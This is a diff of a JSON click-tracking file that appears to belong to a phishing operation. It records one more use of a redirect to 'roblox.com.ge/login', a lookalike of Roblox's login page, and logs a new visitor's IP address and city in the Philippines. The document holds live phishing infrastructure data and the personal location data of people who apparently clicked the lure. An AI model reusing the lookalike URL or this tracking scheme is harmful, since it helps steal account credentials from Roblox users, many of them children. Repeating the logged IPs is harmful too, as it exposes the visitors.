@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1482,
+    "useCount": 1483,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12022,6 +12022,14 @@
         "ip": "119.93.172.144",
         "country": "Philippines",
         "city": "City of Muntinlupa",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777439349184,
+        "ip": "112.198.131.70",
+        "country": "Philippines",
+        "city": "Nasugbu",
         "flag": "🇵🇭",
         "countryCode": "PH"
       }
